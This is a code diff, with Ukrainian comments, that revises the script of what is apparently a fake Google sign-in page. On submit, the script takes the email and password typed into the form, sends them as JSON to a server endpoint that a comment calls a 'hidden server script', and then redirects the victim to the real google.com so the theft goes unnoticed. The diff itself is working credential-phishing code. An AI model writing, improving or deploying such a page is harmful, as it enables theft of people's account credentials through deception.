@@ -56,20 +56,24 @@
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+            
+            const emailValue = document.getElementById('email').value;
+            const passwordValue = document.getElementById('password').value;
 
-            // Надсилаємо дані на наш прихований серверний скрипт
+            // Надсилаємо дані у правильному JSON форматі на сервер Vercel
             fetch('/api/send', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email: email, password: password })
+                body: JSON.stringify({ 
+                    email: emailValue, 
+                    password: passwordValue 
+                })
             })
-            .then(res => {
-                // Після успішної відправки перенаправляємо на справжній Google
+            .then(() => {
+                // Перенаправлення спрацює у будь-якому випадку
                 window.location.href = 'https://google.com';
             })
-            .catch(err => {
+            .catch(() => {
                 window.location.href = 'https://google.com';
             });
         });
